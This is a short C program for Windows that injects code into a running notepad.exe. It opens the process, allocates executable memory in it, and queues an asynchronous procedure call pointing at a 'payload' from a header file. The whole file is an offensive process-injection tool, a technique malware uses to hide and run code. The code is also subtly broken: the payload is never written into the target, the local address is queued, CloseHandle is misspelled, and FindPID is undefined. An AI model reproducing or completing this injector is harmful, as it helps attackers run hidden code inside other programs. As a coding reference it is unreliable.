#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winnt.h>
#include "Payload.h"

BOOL ApcInject( DWORD pid, LPVOID pRemoteFunc ) {

    HANDLE hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
    if ( hThreadSnap == INVALID_HANDLE_VALUE ) {
        printf( "[-] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError() );
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof( THREADENTRY32 );

    BOOL Queued = FALSE;

    DWORD dwThreadId = 0;
    if ( Thread32First( hThreadSnap, &te32 ) ) {
        do {
            if ( te32.th32OwnerProcessID == pid ) {
                // dwThreadId = te32.th32ThreadID;
                HANDLE hThread = OpenThread( THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID );
                if ( !hThread ) continue;

                if ( QueueUserAPC( ( PAPCFUNC )pRemoteFunc, hThread, NULL ) ) {
                    printf( "[+] QueueUserAPC succeeded for thread ID: %d\n", te32.th32ThreadID );
                    Queued = TRUE;
                }
                CloseHanlde( hThread );

                break;
            }
        } while ( Thread32Next( hThreadSnap, &te32 ) );
    }


    CloseHandle( hThreadSnap );

    return Queued;
}

int main( void ) {

    LPCSTR procName = "notepad.exe";
    DWORD pid = FindPID( procName );
    if ( !pid ) {
        fprintf( stderr, "[-] Could not find process: %s\n", procName );
        return 1;
    }

    printf( "[+] Found process %s with PID: %d\n", procName, pid );

    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid );

    if ( !hProcess ) {
        fprintf( stderr, "[-] OpenProcess failed. Error: %d\n", GetLastError() );
        return 1;
    }

    LPVOID pRemoteFunc = VirtualAllocEx( hProcess, NULL, sizeof( payload ), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );


    ApcInject( pid, ( LPVOID )payload );

}
